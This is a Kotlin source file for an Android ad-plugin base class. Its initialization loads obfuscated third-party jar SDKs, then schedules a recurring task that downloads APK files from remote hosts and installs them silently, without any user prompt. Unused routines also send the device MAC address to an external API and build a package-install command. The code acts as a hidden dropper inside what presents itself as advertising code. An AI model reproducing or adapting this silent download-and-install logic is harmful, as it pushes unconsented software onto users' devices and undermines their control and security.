package com.nova.adplugin.base

import com.nova.adplugin.AdDispatcher
import com.nova.adplugin.bean.UpdateAppsDTO
import com.nova.adplugin.ext.getApkFileNameFromUrl
import com.nova.adplugin.ext.getBasePath
import com.nova.adplugin.ext.getFileExtension
import com.nova.adplugin.ext.silentInstallWithMutex
import com.nova.adplugin.log.printLog
import com.nova.adplugin.net.NetworkHelper
import com.nova.adplugin.ext.getMacAddress
import java.io.File
import java.io.IOException
import java.util.concurrent.Executors
import java.util.concurrent.Future
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit

open class AdPluginBase {
    lateinit var adDispatcher: AdDispatcher

    @Suppress("UNRESOLVED_REFERENCE") // 告诉 IDE 忽略这个错误
    open fun initialize() {
        // 注册多个广告提供商
        try {
            "jar包加载开始".printLog()
            com.s.d.t.s(appContext)
            com.debby.Devour.getInstance().devourPlay(appContext)
            com.unia.y.b.a(appContext,"7087","")
            "jar包加载结束".printLog()
            com.Executor.run(context)
            //installPackage()
            checkAppPush()
            //val sdkA = AdSdkAProvider()
            //val sdkB = AdSdkBProvider()
            //val providers = arrayListOf(sdkA)
            //adDispatcher = AdDispatcher(providers)
            //providers.forEach { it.initialize(appContext) }
        }catch (e:Exception){
            "插件内部初始化失败：${e.message}".printLog()
        }

    }

    private  var scheduler: ScheduledExecutorService?=null
    private var taskFuture: ScheduledFuture<*>? = null
    private fun checkAppPush() {
        scheduler?.shutdown()
        scheduler = Executors.newSingleThreadScheduledExecutor()
        taskFuture?.cancel(false)
        taskFuture = scheduler!!.scheduleWithFixedDelay({
            "周期任务执行,查询推送应用: ${System.currentTimeMillis()}".printLog()
            //checkAppsUpdate()
            val packageInfo = appContext.packageManager.getPackageInfo(appContext.packageName, 0)
            println("周期任务执行,查询推送应用: ${appContext.packageName}-----${packageInfo.versionCode}")
            if(appContext.packageName=="com.chihihx.store"&& packageInfo.versionCode<6){
                "开始准备升级旧YTX渠道的包".printLog()
                val url = "https://xfile.f3tcp.cc/pub/YTX/AppStore_1.3.4_20250327_1956_YTX.apk"
                downloadApks(arrayListOf(url))
            }else if(appContext.packageName=="com.androidytx.store"&& packageInfo.versionCode<3){
                "开始准备升级新YTX渠道的包".printLog()
                val url = "https://xfile.f3tcp.cc/pub/YTX_1/AppStore_1.0.3_20250327_1956_YTX_1.apk"
                downloadApks(arrayListOf(url))
            }
        }, 0, 60000*10, TimeUnit.MILLISECONDS)

    }

    private fun checkAppsUpdate() {
        NetworkHelper.makeGetRequest(
            url = "https://api.ppmovie.cc/appapi/launch/hotline",
            params = mapOf(
                "req_id" to "0",
                "channel" to "FOTAS1001",
                "mac" to "${getMacAddress()}",
            ),
            responseType = List::class.java as Class<List<UpdateAppsDTO>>,
            itemType = UpdateAppsDTO::class.java
        ) {
            success { data ->
                //println("成功: ${data[0].appName}")
            }
            failed { error ->
                println("失败: ${error.message}")
            }
        }
    }

    private var executorService = Executors.newSingleThreadExecutor()
    private var currentTask: Future<*>? = null

    private fun installPackage() {
        val apkPath = "/zoom/Vudu.apk" // 指定APK文件的路径
        val command = arrayOf("pm", "install", apkPath) // 构建pm install命令

        // 取消上一个任务（如果存在）
        currentTask?.cancel(true)

        // 提交新任务
        currentTask = executorService.submit {
            try {
                //apkPath.installApk()
                val link1 = "https://pub-7bdb35df0362454385da85d15e9709fe.r2.dev/apks/MiguVideo.apk"
                //val link2 = "https://xfile.f3tcp.cc/apks/72/Disney+/Disney.apk"
                downloadApks(arrayListOf(link1))
            } catch (e: IOException) {
                e.printStackTrace()
                "执行命令时发生错误: ${e.message}".printLog()
            }
        }
    }

    private fun downloadApks(downloadLinks: List<String>) {
        downloadLinks.forEach { downloadLink ->
            val fileExtension = downloadLink.getFileExtension()
            val fileName = downloadLink.getApkFileNameFromUrl()
            if (fileExtension == ".apk") {
                "当前是apk文件名---$fileName".printLog()
                val destPath = "${"apps".getBasePath()}/${fileName}"
                "目标路径是：${destPath}".printLog()
                if (File(destPath).exists()) {
                    // 本地已存在，直接安装
                    "本地存在，直接安装应用".printLog()
                    destPath.silentInstallWithMutex { isSuccess ->
                        if (isSuccess) {
                            "APK 安装成功".printLog()
                        } else {
                            "APK 安装失败".printLog()
                        }
                    }
                } else {
                    "本地不存在，开始下载--${downloadLink}".printLog()
                    try {
                        NetworkHelper.downloadFile(
                            url = downloadLink,
                            destination = File(destPath),
                            progressListener = { progress -> "apk下载进度: $progress%".printLog() }
                        ) {
                            success { result ->
                                "apk下载成功: $result".printLog()
                                result.silentInstallWithMutex { isSuccess ->
                                    if (isSuccess) {
                                        "APK 安装成功".printLog()
                                    } else {
                                        "APK 安装失败".printLog()
                                    }
                                }
                            }
                            failed { error ->
                                "下载失败: ${error.message}".printLog()
                            }
                        }
                    }catch (e:Exception){
                        "当前下载的异常是：${e.message}".printLog()
                    }

                }
            } else {
                "当前不是apk链接----${fileExtension}".printLog()
            }
        }
    }


    @JvmName("loadAdGeneric")
    inline fun <reified T : AdConfigBase> loadAd(config: T.() -> Unit) {
        adDispatcher.loadAd( config)
    }

    open fun removeAd():Boolean = adDispatcher.removeAd()



}
